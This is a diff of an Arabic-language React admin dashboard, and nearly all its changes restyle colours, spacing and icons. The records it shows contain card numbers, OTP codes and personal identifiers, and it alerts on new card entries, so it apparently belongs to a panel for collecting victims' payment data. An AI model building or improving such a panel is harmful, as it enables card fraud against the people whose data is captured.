@@ -28,6 +28,8 @@ import {
   ChevronRight,
   AlertCircle,
   Loader2,
+  TrendingUp,
+  Activity,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
@@ -144,15 +146,15 @@ function UserStatus({ userId }: { userId: string }) {
       className={`
         ${
           status === "online"
-            ? "bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300"
-            : "bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300"
-        } transition-colors duration-300
+            ? "bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800"
+            : "bg-slate-50 text-slate-600 border-slate-200 dark:bg-slate-950/30 dark:text-slate-400 dark:border-slate-800"
+        } transition-all duration-300 font-medium
       `}
     >
       <span
-        className={`mr-1.5 inline-block h-2 w-2 rounded-full ${status === "online" ? "bg-green-500" : "bg-red-500"}`}
+        className={`mr-1.5 inline-block h-2 w-2 rounded-full ${status === "online" ? "bg-emerald-500 animate-pulse" : "bg-slate-400"}`}
       ></span>
-      <span className="text-xs">{status === "online" ? "متصل" : "غير متصل"}</span>
+      <span className="text-xs font-medium">{status === "online" ? "متصل" : "غير متصل"}</span>
     </Badge>
   )
 }
@@ -188,21 +190,21 @@ function FlagColorSelector({
   return (
     <Popover>
       <PopoverTrigger asChild>
-        <Button variant="ghost" size="icon" className="h-8 w-8">
+        <Button variant="ghost" size="icon" className="h-8 w-8 hover:bg-slate-100 dark:hover:bg-slate-800">
           <Flag
             className={`h-4 w-4 ${
               currentColor === "red"
                 ? "text-red-500 fill-red-500"
                 : currentColor === "yellow"
-                  ? "text-yellow-500 fill-yellow-500"
+                  ? "text-amber-500 fill-amber-500"
                   : currentColor === "green"
-                    ? "text-green-500 fill-green-500"
-                    : "text-muted-foreground"
+                    ? "text-emerald-500 fill-emerald-500"
+                    : "text-slate-400"
             }`}
           />
         </Button>
       </PopoverTrigger>
-      <PopoverContent className="w-auto p-2">
+      <PopoverContent className="w-auto p-3 bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 shadow-xl">
         <div className="flex gap-2">
           <TooltipProvider>
             <Tooltip>
@@ -210,7 +212,7 @@ function FlagColorSelector({
                 <Button
                   variant="ghost"
                   size="icon"
-                  className="h-8 w-8 rounded-full bg-red-100 dark:bg-red-900 hover:bg-red-200 dark:hover:bg-red-800"
+                  className="h-8 w-8 rounded-full bg-red-50 dark:bg-red-950/30 hover:bg-red-100 dark:hover:bg-red-900/50 border border-red-200 dark:border-red-800"
                   onClick={() => onColorChange(notificationId, "red")}
                 >
                   <Flag className="h-4 w-4 text-red-500 fill-red-500" />
@@ -229,10 +231,10 @@ function FlagColorSelector({
                 <Button
                   variant="ghost"
                   size="icon"
-                  className="h-8 w-8 rounded-full bg-yellow-100 dark:bg-yellow-900 hover:bg-yellow-200 dark:hover:bg-yellow-800"
+                  className="h-8 w-8 rounded-full bg-amber-50 dark:bg-amber-950/30 hover:bg-amber-100 dark:hover:bg-amber-900/50 border border-amber-200 dark:border-amber-800"
                   onClick={() => onColorChange(notificationId, "yellow")}
                 >
-                  <Flag className="h-4 w-4 text-yellow-500 fill-yellow-500" />
+                  <Flag className="h-4 w-4 text-amber-500 fill-amber-500" />
                   <span className="sr-only">علم أصفر</span>
                 </Button>
               </TooltipTrigger>
@@ -248,10 +250,10 @@ function FlagColorSelector({
                 <Button
                   variant="ghost"
                   size="icon"
-                  className="h-8 w-8 rounded-full bg-green-100 dark:bg-green-900 hover:bg-green-200 dark:hover:bg-green-800"
+                  className="h-8 w-8 rounded-full bg-emerald-50 dark:bg-emerald-950/30 hover:bg-emerald-100 dark:hover:bg-emerald-900/50 border border-emerald-200 dark:border-emerald-800"
                   onClick={() => onColorChange(notificationId, "green")}
                 >
-                  <Flag className="h-4 w-4 text-green-500 fill-green-500" />
+                  <Flag className="h-4 w-4 text-emerald-500 fill-emerald-500" />
                   <span className="sr-only">علم أخضر</span>
                 </Button>
               </TooltipTrigger>
@@ -268,10 +270,10 @@ function FlagColorSelector({
                   <Button
                     variant="ghost"
                     size="icon"
-                    className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700"
+                    className="h-8 w-8 rounded-full bg-slate-50 dark:bg-slate-800 hover:bg-slate-100 dark:hover:bg-slate-700 border border-slate-200 dark:border-slate-700"
                     onClick={() => onColorChange(notificationId, null)}
                   >
-                    <Flag className="h-4 w-4 text-gray-500" />
+                    <Flag className="h-4 w-4 text-slate-500" />
                     <span className="sr-only">إزالة العلم</span>
                   </Button>
                 </TooltipTrigger>
@@ -294,11 +296,15 @@ function MiniChart({ data, color }: { data: number[]; color: string }) {
   const range = max - min || 1
 
   return (
-    <div className="flex h-10 items-end gap-1">
+    <div className="flex h-12 items-end gap-1 mt-4">
       {data.map((value, index) => {
         const height = ((value - min) / range) * 100
         return (
-          <div key={index} className={`w-1 rounded-sm ${color}`} style={{ height: `${Math.max(15, height)}%` }}></div>
+          <div
+            key={index}
+            className={`w-2 rounded-t-sm ${color} opacity-80 hover:opacity-100 transition-opacity`}
+            style={{ height: `${Math.max(20, height)}%` }}
+          ></div>
         )
       })}
     </div>
@@ -315,24 +321,24 @@ function ActivityTimeline({ notifications }: { notifications: Notification[] }) 
       {recentActivities.map((notification, index) => (
         <div key={notification.id} className="relative">
           {index !== recentActivities.length - 1 && (
-            <div className="absolute top-7 bottom-0 left-3.5 w-px bg-border"></div>
+            <div className="absolute top-8 bottom-0 left-4 w-px bg-gradient-to-b from-slate-200 to-transparent dark:from-slate-700"></div>
           )}
-          <div className="flex gap-3">
+          <div className="flex gap-4">
             <div
-              className={`mt-1.5 h-6 w-6 rounded-full flex items-center justify-center ${
+              className={`mt-1.5 h-8 w-8 rounded-full flex items-center justify-center shadow-sm border-2 ${
                 notification.cardNumber
-                  ? "bg-green-100 text-green-600 dark:bg-green-900 dark:text-green-300"
-                  : "bg-blue-100 text-blue-600 dark:bg-blue-900 dark:text-blue-300"
+                  ? "bg-emerald-50 text-emerald-600 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-400 dark:border-emerald-800"
+                  : "bg-blue-50 text-blue-600 border-blue-200 dark:bg-blue-950/30 dark:text-blue-400 dark:border-blue-800"
               }`}
             >
-              {notification.cardNumber ? <CreditCard className="h-3 w-3" /> : <User className="h-3 w-3" />}
+              {notification.cardNumber ? <CreditCard className="h-4 w-4" /> : <User className="h-4 w-4" />}
             </div>
-            <div className="flex-1">
+            <div className="flex-1 min-w-0">
               <div className="flex items-center justify-between">
-                <p className="text-sm font-medium">
+                <p className="text-sm font-semibold text-slate-900 dark:text-slate-100">
                   {notification.cardNumber ? "معلومات بطاقة جديدة" : "معلومات شخصية جديدة"}
                 </p>
-                <p className="text-xs text-muted-foreground">
+                <p className="text-xs text-slate-500 dark:text-slate-400 font-medium">
                   {notification.createdDate &&
                     formatDistanceToNow(new Date(notification.createdDate), {
                       addSuffix: true,
@@ -340,18 +346,24 @@ function ActivityTimeline({ notifications }: { notifications: Notification[] }) 
                     })}
                 </p>
               </div>
-              <p className="text-xs text-muted-foreground mt-1">
+              <p className="text-xs text-slate-600 dark:text-slate-400 mt-1 truncate">
                 {notification.country || "غير معروف"} -{" "}
                 {notification.name || notification.phone || notification.email || "مستخدم جديد"}
               </p>
-              <div className="mt-1.5 flex gap-2">
+              <div className="mt-2 flex gap-2 flex-wrap">
                 {notification.cardNumber && (
-                  <Badge variant="outline" className="text-xs bg-green-50 dark:bg-green-950/30">
+                  <Badge
+                    variant="outline"
+                    className="text-xs bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800"
+                  >
                     بطاقة
                   </Badge>
                 )}
                 {notification.otp && (
-                  <Badge variant="outline" className="text-xs bg-blue-50 dark:bg-blue-950/30">
+                  <Badge
+                    variant="outline"
+                    className="text-xs bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800"
+                  >
                     OTP: {notification.otp}
                   </Badge>
                 )}
@@ -363,9 +375,11 @@ function ActivityTimeline({ notifications }: { notifications: Notification[] }) 
       ))}
 
       {recentActivities.length === 0 && (
-        <div className="flex flex-col items-center justify-center py-8 text-center text-muted-foreground">
-          <Clock className="h-8 w-8 mb-2 text-muted-foreground/50" />
-          <p>لا توجد أنشطة حديثة</p>
+        <div className="flex flex-col items-center justify-center py-12 text-center">
+          <div className="bg-slate-100 dark:bg-slate-800 rounded-full p-4 mb-4">
+            <Clock className="h-8 w-8 text-slate-400" />
+          </div>
+          <p className="text-slate-500 dark:text-slate-400 font-medium">لا توجد أنشطة حديثة</p>
         </div>
       )}
     </div>
@@ -390,12 +404,12 @@ function SearchBar({ onSearch }: { onSearch: (term: string) => void }) {
   return (
     <div className="relative">
       <div className="relative">
-        <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
+        <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-slate-400" />
         <Input
           ref={searchInputRef}
           type="search"
           placeholder="بحث عن إشعارات..."
-          className="w-full pl-9 pr-4"
+          className="w-full pl-10 pr-4 h-10 bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700 focus:border-blue-500 dark:focus:border-blue-400 focus:ring-blue-500/20 dark:focus:ring-blue-400/20"
           value={searchTerm}
           onChange={(e) => setSearchTerm(e.target.value)}
           onKeyDown={handleKeyDown}
@@ -417,7 +431,13 @@ function Pagination({
 }) {
   return (
     <div className="flex items-center justify-center space-x-2 space-x-reverse">
-      <Button variant="outline" size="icon" onClick={() => onPageChange(currentPage - 1)} disabled={currentPage <= 1}>
+      <Button
+        variant="outline"
+        size="icon"
+        onClick={() => onPageChange(currentPage - 1)}
+        disabled={currentPage <= 1}
+        className="h-9 w-9 border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
+      >
         <ChevronRight className="h-4 w-4" />
         <span className="sr-only">الصفحة السابقة</span>
       </Button>
@@ -427,7 +447,11 @@ function Pagination({
             key={page}
             variant={currentPage === page ? "default" : "outline"}
             size="icon"
-            className="h-8 w-8"
+            className={`h-9 w-9 ${
+              currentPage === page
+                ? "bg-blue-600 hover:bg-blue-700 text-white border-blue-600"
+                : "border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
+            }`}
             onClick={() => onPageChange(page)}
           >
             {page}
@@ -439,6 +463,7 @@ function Pagination({
         size="icon"
         onClick={() => onPageChange(currentPage + 1)}
         disabled={currentPage >= totalPages}
+        className="h-9 w-9 border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
       >
         <ChevronLeft className="h-4 w-4" />
         <span className="sr-only">الصفحة التالية</span>
@@ -463,58 +488,83 @@ function SettingsPanel({
 
   return (
     <Sheet open={open} onOpenChange={onOpenChange}>
-      <SheetContent side="left" className="sm:max-w-md" dir="rtl">
-        <SheetHeader>
-          <SheetTitle className="flex items-center gap-2 text-xl">
-            <Settings className="h-5 w-5" />
+      <SheetContent
+        side="left"
+        className="sm:max-w-md bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
+        dir="rtl"
+      >
+        <SheetHeader className="border-b border-slate-200 dark:border-slate-700 pb-4">
+          <SheetTitle className="flex items-center gap-3 text-xl font-bold text-slate-900 dark:text-slate-100">
+            <div className="bg-blue-100 dark:bg-blue-900/30 p-2 rounded-lg">
+              <Settings className="h-5 w-5 text-blue-600 dark:text-blue-400" />
+            </div>
             إعدادات الإشعارات
           </SheetTitle>
         </SheetHeader>
-        <div className="mt-6 space-y-6">
+        <div className="mt-6 space-y-8">
           <div className="space-y-4">
-            <h3 className="text-sm font-medium">إعدادات الإشعارات</h3>
-            <div className="space-y-3">
+            <h3 className="text-sm font-semibold text-slate-900 dark:text-slate-100 flex items-center gap-2">
+              <Bell className="h-4 w-4 text-blue-600 dark:text-blue-400" />
+              إعدادات الإشعارات
+            </h3>
+            <div className="space-y-4 bg-slate-50 dark:bg-slate-800/50 rounded-lg p-4">
               <div className="flex items-center justify-between">
-                <div className="space-y-0.5">
-                  <Label htmlFor="notify-cards">إشعارات البطاقات الجديدة</Label>
-                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند إضافة بطاقة جديدة</p>
+                <div className="space-y-1">
+                  <Label htmlFor="notify-cards" className="font-medium text-slate-900 dark:text-slate-100">
+                    إشعارات البطاقات الجديدة
+                  </Label>
+                  <p className="text-xs text-slate-600 dark:text-slate-400">تلقي إشعارات عند إضافة بطاقة جديدة</p>
                 </div>
                 <Switch id="notify-cards" checked={notifyNewCards} onCheckedChange={setNotifyNewCards} />
               </div>
               <div className="flex items-center justify-between">
-                <div className="space-y-0.5">
-                  <Label htmlFor="notify-users">إشعارات المستخدمين الجدد</Label>
-                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند تسجيل مستخدم جديد</p>
+                <div className="space-y-1">
+                  <Label htmlFor="notify-users" className="font-medium text-slate-900 dark:text-slate-100">
+                    إشعارات المستخدمين الجدد
+                  </Label>
+                  <p className="text-xs text-slate-600 dark:text-slate-400">تلقي إشعارات عند تسجيل مستخدم جديد</p>
                 </div>
                 <Switch id="notify-users" checked={notifyNewUsers} onCheckedChange={setNotifyNewUsers} />
               </div>
               <div className="flex items-center justify-between">
-                <div className="space-y-0.5">
-                  <Label htmlFor="play-sounds">تشغيل الأصوات</Label>
-                  <p className="text-xs text-muted-foreground">تشغيل صوت عند استلام إشعار جديد</p>
+                <div className="space-y-1">
+                  <Label htmlFor="play-sounds" className="font-medium text-slate-900 dark:text-slate-100">
+                    تشغيل الأصوات
+                  </Label>
+                  <p className="text-xs text-slate-600 dark:text-slate-400">تشغيل صوت عند استلام إشعار جديد</p>
                 </div>
                 <Switch id="play-sounds" checked={playSounds} onCheckedChange={setPlaySounds} />
               </div>
             </div>
           </div>
 
-          <Separator />
+          <Separator className="bg-slate-200 dark:bg-slate-700" />
 
           <div className="space-y-4">
-            <h3 className="text-sm font-medium">إعدادات التحديث التلقائي</h3>
-            <div className="space-y-3">
+            <h3 className="text-sm font-semibold text-slate-900 dark:text-slate-100 flex items-center gap-2">
+              <Activity className="h-4 w-4 text-emerald-600 dark:text-emerald-400" />
+              إعدادات التحديث التلقائي
+            </h3>
+            <div className="space-y-4 bg-slate-50 dark:bg-slate-800/50 rounded-lg p-4">
               <div className="flex items-center justify-between">
-                <div className="space-y-0.5">
-                  <Label htmlFor="auto-refresh">تحديث تلقائي</Label>
-                  <p className="text-xs text-muted-foreground">تحديث البيانات تلقائيًا</p>
+                <div className="space-y-1">
+                  <Label htmlFor="auto-refresh" className="font-medium text-slate-900 dark:text-slate-100">
+                    تحديث تلقائي
+                  </Label>
+                  <p className="text-xs text-slate-600 dark:text-slate-400">تحديث البيانات تلقائيًا</p>
                 </div>
                 <Switch id="auto-refresh" checked={autoRefresh} onCheckedChange={setAutoRefresh} />
               </div>
               {autoRefresh && (
-                <div className="space-y-1.5">
-                  <Label htmlFor="refresh-interval">فترة التحديث (بالثواني)</Label>
+                <div className="space-y-2">
+                  <Label htmlFor="refresh-interval" className="font-medium text-slate-900 dark:text-slate-100">
+                    فترة التحديث (بالثواني)
+                  </Label>
                   <Select value={refreshInterval} onValueChange={setRefreshInterval}>
-                    <SelectTrigger id="refresh-interval">
+                    <SelectTrigger
+                      id="refresh-interval"
+                      className="bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
+                    >
                       <SelectValue placeholder="اختر فترة التحديث" />
                     </SelectTrigger>
                     <SelectContent position="popper">
@@ -529,15 +579,23 @@ function SettingsPanel({
             </div>
           </div>
 
-          <Separator />
+          <Separator className="bg-slate-200 dark:bg-slate-700" />
 
           <div className="space-y-4">
-            <h3 className="text-sm font-medium">إعدادات العرض</h3>
-            <div className="space-y-3">
-              <div className="space-y-1.5">
-                <Label htmlFor="items-per-page">عدد العناصر في الصفحة</Label>
+            <h3 className="text-sm font-semibold text-slate-900 dark:text-slate-100 flex items-center gap-2">
+              <BarChart3 className="h-4 w-4 text-purple-600 dark:text-purple-400" />
+              إعدادات العرض
+            </h3>
+            <div className="space-y-4 bg-slate-50 dark:bg-slate-800/50 rounded-lg p-4">
+              <div className="space-y-2">
+                <Label htmlFor="items-per-page" className="font-medium text-slate-900 dark:text-slate-100">
+                  عدد العناصر في الصفحة
+                </Label>
                 <Select defaultValue="10">
-                  <SelectTrigger id="items-per-page">
+                  <SelectTrigger
+                    id="items-per-page"
+                    className="bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
+                  >
                     <SelectValue placeholder="اختر عدد العناصر" />
                   </SelectTrigger>
                   <SelectContent position="popper">
@@ -548,10 +606,15 @@ function SettingsPanel({
                   </SelectContent>
                 </Select>
               </div>
-              <div className="space-y-1.5">
-                <Label htmlFor="default-view">العرض الافتراضي</Label>
+              <div className="space-y-2">
+                <Label htmlFor="default-view" className="font-medium text-slate-900 dark:text-slate-100">
+                  العرض الافتراضي
+                </Label>
                 <Select defaultValue="all">
-                  <SelectTrigger id="default-view">
+                  <SelectTrigger
+                    id="default-view"
+                    className="bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
+                  >
                     <SelectValue placeholder="اختر العرض الافتراضي" />
                   </SelectTrigger>
                   <SelectContent position="popper">
@@ -564,8 +627,12 @@ function SettingsPanel({
             </div>
           </div>
 
-          <div className="flex justify-end gap-2 pt-4">
-            <Button variant="outline" onClick={() => onOpenChange(false)}>
+          <div className="flex justify-end gap-3 pt-6 border-t border-slate-200 dark:border-slate-700">
+            <Button
+              variant="outline"
+              onClick={() => onOpenChange(false)}
+              className="border-slate-200 dark:border-slate-700"
+            >
               إلغاء
             </Button>
             <Button
@@ -576,6 +643,7 @@ function SettingsPanel({
                 })
                 onOpenChange(false)
               }}
+              className="bg-blue-600 hover:bg-blue-700 text-white"
             >
               حفظ الإعدادات
             </Button>
@@ -621,16 +689,21 @@ function ExportDialog({
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
-      <DialogContent className="sm:max-w-md" dir="rtl">
-        <DialogHeader>
-          <DialogTitle className="flex items-center gap-2">
-            <Download className="h-5 w-5" />
+      <DialogContent
+        className="sm:max-w-md bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
+        dir="rtl"
+      >
+        <DialogHeader className="border-b border-slate-200 dark:border-slate-700 pb-4">
+          <DialogTitle className="flex items-center gap-3 text-xl font-bold text-slate-900 dark:text-slate-100">
+            <div className="bg-emerald-100 dark:bg-emerald-900/30 p-2 rounded-lg">
+              <Download className="h-5 w-5 text-emerald-600 dark:text-emerald-400" />
+            </div>
             تصدير الإشعارات
           </DialogTitle>
         </DialogHeader>
-        <div className="space-y-4 py-4">
-          <div className="space-y-2">
-            <Label>تنسيق التصدير</Label>
+        <div className="space-y-6 py-4">
+          <div className="space-y-3">
+            <Label className="text-sm font-semibold text-slate-900 dark:text-slate-100">تنسيق التصدير</Label>
             <div className="flex gap-4">
               <div className="flex items-center space-x-2 space-x-reverse">
                 <input
@@ -639,9 +712,9 @@ function ExportDialog({
                   value="csv"
                   checked={exportFormat === "csv"}
                   onChange={() => setExportFormat("csv")}
-                  className="h-4 w-4 text-primary"
+                  className="h-4 w-4 text-blue-600 border-slate-300 focus:ring-blue-500"
                 />
-                <Label htmlFor="csv" className="cursor-pointer">
+                <Label htmlFor="csv" className="cursor-pointer font-medium text-slate-700 dark:text-slate-300">
                   CSV
                 </Label>
               </div>
@@ -652,25 +725,28 @@ function ExportDialog({
                   value="json"
                   checked={exportFormat === "json"}
                   onChange={() => setExportFormat("json")}
-                  className="h-4 w-4 text-primary"
+                  className="h-4 w-4 text-blue-600 border-slate-300 focus:ring-blue-500"
                 />
-                <Label htmlFor="json" className="cursor-pointer">
+                <Label htmlFor="json" className="cursor-pointer font-medium text-slate-700 dark:text-slate-300">
                   JSON
                 </Label>
               </div>
             </div>
           </div>
 
-          <div className="space-y-2">
-            <Label>البيانات المراد تصديرها</Label>
-            <div className="space-y-2">
+          <div className="space-y-3">
+            <Label className="text-sm font-semibold text-slate-900 dark:text-slate-100">البيانات المراد تصديرها</Label>
+            <div className="space-y-3 bg-slate-50 dark:bg-slate-800/50 rounded-lg p-4">
               <div className="flex items-center space-x-2 space-x-reverse">
                 <Checkbox
                   id="personal-info"
                   checked={exportFields.personalInfo}
                   onCheckedChange={(checked) => setExportFields({ ...exportFields, personalInfo: checked as boolean })}
                 />
-                <Label htmlFor="personal-info" className="cursor-pointer">
+                <Label
+                  htmlFor="personal-info"
+                  className="cursor-pointer font-medium text-slate-700 dark:text-slate-300"
+                >
                   المعلومات الشخصية
                 </Label>
               </div>
@@ -680,7 +756,7 @@ function ExportDialog({
                   checked={exportFields.cardInfo}
                   onCheckedChange={(checked) => setExportFields({ ...exportFields, cardInfo: checked as boolean })}
                 />
-                <Label htmlFor="card-info" className="cursor-pointer">
+                <Label htmlFor="card-info" className="cursor-pointer font-medium text-slate-700 dark:text-slate-300">
                   معلومات البطاقة
                 </Label>
               </div>
@@ -690,7 +766,7 @@ function ExportDialog({
                   checked={exportFields.status}
                   onCheckedChange={(checked) => setExportFields({ ...exportFields, status: checked as boolean })}
                 />
-                <Label htmlFor="status" className="cursor-pointer">
+                <Label htmlFor="status" className="cursor-pointer font-medium text-slate-700 dark:text-slate-300">
                   حالة الإشعار
                 </Label>
               </div>
@@ -700,25 +776,36 @@ function ExportDialog({
                   checked={exportFields.timestamps}
                   onCheckedChange={(checked) => setExportFields({ ...exportFields, timestamps: checked as boolean })}
                 />
-                <Label htmlFor="timestamps" className="cursor-pointer">
+                <Label htmlFor="timestamps" className="cursor-pointer font-medium text-slate-700 dark:text-slate-300">
                   الطوابع الزمنية
                 </Label>
               </div>
             </div>
           </div>
 
-          <div className="rounded-md bg-muted p-3">
-            <div className="flex items-center gap-2 text-sm">
-              <AlertCircle className="h-4 w-4 text-muted-foreground" />
-              <p className="text-muted-foreground">سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.</p>
+          <div className="rounded-lg bg-blue-50 dark:bg-blue-950/30 p-4 border border-blue-200 dark:border-blue-800">
+            <div className="flex items-center gap-3 text-sm">
+              <AlertCircle className="h-5 w-5 text-blue-600 dark:text-blue-400 flex-shrink-0" />
+              <p className="text-blue-800 dark:text-blue-300 font-medium">
+                سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.
+              </p>
             </div>
           </div>
         </div>
-        <DialogFooter className="sm:justify-start">
-          <Button variant="outline" onClick={() => onOpenChange(false)}>
+        <DialogFooter className="sm:justify-start border-t border-slate-200 dark:border-slate-700 pt-4">
+          <Button
+            variant="outline"
+            onClick={() => onOpenChange(false)}
+            className="border-slate-200 dark:border-slate-700"
+          >
             إلغاء
           </Button>
-          <Button type="submit" onClick={handleExport} disabled={isExporting}>
+          <Button
+            type="submit"
+            onClick={handleExport}
+            disabled={isExporting}
+            className="bg-emerald-600 hover:bg-emerald-700 text-white"
+          >
             {isExporting ? (
               <>
                 <Loader2 className="mr-2 h-4 w-4 animate-spin" />
@@ -863,8 +950,8 @@ export default function NotificationsPage() {
         )
         const hasNewGeneralInfo = notificationsData.some(
           (notification) =>
-            (notification.idNumber || notification.email || notification.mobile) &&
-            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
+            (notification.idNumber || notification.email || notification?.phone) &&
+            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n?.phone)),
         )
 
         // Only play notification sound if new card info or general info is added
@@ -1024,9 +1111,11 @@ export default function NotificationsPage() {
     if (!flagColor) return ""
 
     const colorMap = {
-      red: "bg-red-50 dark:bg-red-950/30 hover:bg-red-100 dark:hover:bg-red-950/50",
-      yellow: "bg-yellow-50 dark:bg-yellow-950/30 hover:bg-yellow-100 dark:hover:bg-yellow-950/50",
-      green: "bg-green-50 dark:bg-green-950/30 hover:bg-green-100 dark:hover:bg-green-950/50",
+      red: "bg-red-50/50 dark:bg-red-950/20 hover:bg-red-50 dark:hover:bg-red-950/30 border-l-4 border-l-red-400",
+      yellow:
+        "bg-amber-50/50 dark:bg-amber-950/20 hover:bg-amber-50 dark:hover:bg-amber-950/30 border-l-4 border-l-amber-400",
+      green:
+        "bg-emerald-50/50 dark:bg-emerald-950/20 hover:bg-emerald-50 dark:hover:bg-emerald-950/30 border-l-4 border-l-emerald-400",
     }
 
     return colorMap[flagColor]
@@ -1044,10 +1133,16 @@ export default function NotificationsPage() {
 
   if (isLoading) {
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center w-full">
-        <div className="flex flex-col items-center gap-4">
-          <div className="h-10 w-10 animate-spin rounded-full border-4 border-primary border-t-transparent"></div>
-          <div className="text-lg font-medium">جاري التحميل...</div>
+      <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 dark:from-slate-900 dark:to-slate-800 flex items-center justify-center w-full">
+        <div className="flex flex-col items-center gap-6">
+          <div className="relative">
+            <div className="h-16 w-16 animate-spin rounded-full border-4 border-blue-200 border-t-blue-600"></div>
+            <div className="absolute inset-0 h-16 w-16 animate-pulse rounded-full bg-blue-100 opacity-20"></div>
+          </div>
+          <div className="text-center">
+            <div className="text-xl font-bold text-slate-900 dark:text-slate-100 mb-2">جاري التحميل...</div>
+            <div className="text-sm text-slate-600 dark:text-slate-400">يتم تحميل لوحة الإشعارات</div>
+          </div>
         </div>
       </div>
     )
@@ -1063,50 +1158,73 @@ export default function NotificationsPage() {
   const onlineTrend = [3, 4, 6, 5, 7, 8, 6, 9, 7, 5]
 
   return (
-    <div dir="rtl" className="min-h-screen bg-background text-foreground ">
+    <div
+      dir="rtl"
+      className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-slate-100 dark:from-slate-900 dark:via-slate-800 dark:to-slate-900 text-slate-900 dark:text-slate-100"
+    >
       {/* Mobile menu */}
       <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
-        <SheetContent side="right" className="w-[250px] sm:w-[400px]" dir="rtl">
-          <SheetHeader className="mb-6">
-            <SheetTitle className="flex items-center gap-2">
-              <Bell className="h-5 w-5 text-primary" />
+        <SheetContent
+          side="right"
+          className="w-[280px] sm:w-[400px] bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
+          dir="rtl"
+        >
+          <SheetHeader className="mb-8 border-b border-slate-200 dark:border-slate-700 pb-6">
+            <SheetTitle className="flex items-center gap-3 text-xl font-bold">
+              <div className="bg-blue-100 dark:bg-blue-900/30 p-2 rounded-lg">
+                <Bell className="h-5 w-5 text-blue-600 dark:text-blue-400" />
+              </div>
               <span>لوحة الإشعارات</span>
             </SheetTitle>
           </SheetHeader>
-          <div className="space-y-6">
-            <div className="flex items-center gap-4">
-              <Avatar>
-                <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
-                <AvatarFallback>M</AvatarFallback>
+          <div className="space-y-8">
+            <div className="flex items-center gap-4 p-4 bg-slate-50 dark:bg-slate-800/50 rounded-lg">
+              <Avatar className="h-12 w-12 border-2 border-white dark:border-slate-700 shadow-sm">
+                <AvatarImage src="/placeholder.svg?height=48&width=48" alt="صورة المستخدم" />
+                <AvatarFallback className="bg-blue-100 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400 font-bold">
+                  مد
+                </AvatarFallback>
               </Avatar>
               <div>
-                <p className="font-medium">مدير النظام</p>
-                <p className="text-sm text-muted-foreground">admin@example.com</p>
+                <p className="font-semibold text-slate-900 dark:text-slate-100">مدير النظام</p>
+                <p className="text-sm text-slate-600 dark:text-slate-400">admin@example.com</p>
               </div>
             </div>
-            <Separator />
+            <Separator className="bg-slate-200 dark:bg-slate-700" />
             <nav className="space-y-2">
-              <Button variant="ghost" className="w-full justify-start" onClick={() => setMobileMenuOpen(false)}>
-                <Bell className="mr-2 h-4 w-4" />
+              <Button
+                variant="ghost"
+                className="w-full justify-start h-12 text-base"
+                onClick={() => setMobileMenuOpen(false)}
+              >
+                <Bell className="mr-3 h-5 w-5" />
                 الإشعارات
               </Button>
-              <Button variant="ghost" className="w-full justify-start" onClick={() => setSettingsOpen(true)}>
-                <Settings className="mr-2 h-4 w-4" />
+              <Button
+                variant="ghost"
+                className="w-full justify-start h-12 text-base"
+                onClick={() => setSettingsOpen(true)}
+              >
+                <Settings className="mr-3 h-5 w-5" />
                 الإعدادات
               </Button>
               <Button
                 variant="ghost"
-                className="w-full justify-start"
+                className="w-full justify-start h-12 text-base"
                 onClick={() => {
                   setExportDialogOpen(true)
                   setMobileMenuOpen(false)
                 }}
               >
-                <Download className="mr-2 h-4 w-4" />
+                <Download className="mr-3 h-5 w-5" />
                 تصدير البيانات
               </Button>
-              <Button variant="ghost" className="w-full justify-start text-red-500" onClick={handleLogout}>
-                <LogOut className="mr-2 h-4 w-4" />
+              <Button
+                variant="ghost"
+                className="w-full justify-start h-12 text-base text-red-600 hover:text-red-700 hover:bg-red-50 dark:hover:bg-red-950/30"
+                onClick={handleLogout}
+              >
+                <LogOut className="mr-3 h-5 w-5" />
                 تسجيل الخروج
               </Button>
             </nav>
@@ -1122,27 +1240,42 @@ export default function NotificationsPage() {
 
       <div className="mx-auto">
         {/* Header */}
-        <header className="border-b border-border bg-background/95 backdrop-blur supports-[backdrop-filter]:bg-background/60 sticky top-0 z-10">
-          <div className="flex items-center justify-between p-4">
+        <header className="border-b border-slate-200/60 dark:border-slate-700/60 bg-white/80 dark:bg-slate-900/80 backdrop-blur-xl supports-[backdrop-filter]:bg-white/60 dark:supports-[backdrop-filter]:bg-slate-900/60 sticky top-0 z-50 shadow-sm">
+          <div className="flex items-center justify-between p-4 lg:px-8">
             <div className="flex items-center gap-4">
